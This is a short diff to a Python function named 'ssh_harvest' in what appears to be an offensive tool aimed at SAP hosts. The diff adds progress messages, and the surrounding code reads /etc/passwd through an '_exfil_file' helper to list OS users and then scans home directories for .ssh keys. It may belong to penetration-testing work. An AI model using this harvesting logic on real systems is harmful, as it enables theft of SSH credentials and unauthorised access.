@@ -378,6 +378,7 @@ def ssh_harvest(node: SAPNode, state: SAPMAPState,
         return result
 
     # 1b. Try /etc/passwd for additional users (may fail on hardened systems)
+    print(f"  [*] {sid}: reading /etc/passwd for OS user enumeration ...")
     passwd_raw = _exfil_file(exec_fn, "/etc/passwd", max_size=65536)
     if passwd_raw:
         for line in passwd_raw.decode("utf-8", errors="replace").splitlines():
@@ -427,6 +428,8 @@ def ssh_harvest(node: SAPNode, state: SAPMAPState,
             home_dirs[sidadm] = sidadm_home
 
     ssh_dirs = {}
+    print(f"  [*] {sid}: scanning {len(homes_to_check)} home directories "
+          f"for .ssh ...")
 
     if is_root:
         # Root channel: combine ALL home dirs into one python3 call.
